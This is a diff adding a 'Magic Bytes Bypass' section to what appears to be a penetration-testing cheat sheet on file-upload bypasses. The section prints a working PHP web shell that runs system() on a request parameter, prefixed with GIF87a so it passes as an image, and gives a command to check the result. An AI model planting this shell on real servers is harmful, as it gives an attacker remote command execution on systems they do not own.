@@ -69,6 +69,27 @@ Sve the file, then upload it to the server. After that, try to reupload your fil
 
 Upload the file to get your shell if bypassed successfully.
 
+## Magic Bytes Bypass
+
+If an upload functionality permits only for example, image files, we can append some "Magic Bytes" on our reverse shell to make it an image file.
+
+    GIF87a
+    <?php
+    
+    if(isset($_REQUEST['cmd'])){
+            echo "<pre>";
+            $cmd = ($_REQUEST['cmd']);
+            system($cmd);
+            echo "</pre>";
+            die;
+    }
+    
+    ?>
+
+Then verify with 
+
+    file shell.php
+
 ## Web Shells
 
 | **Web Shell**   | **Description**   |
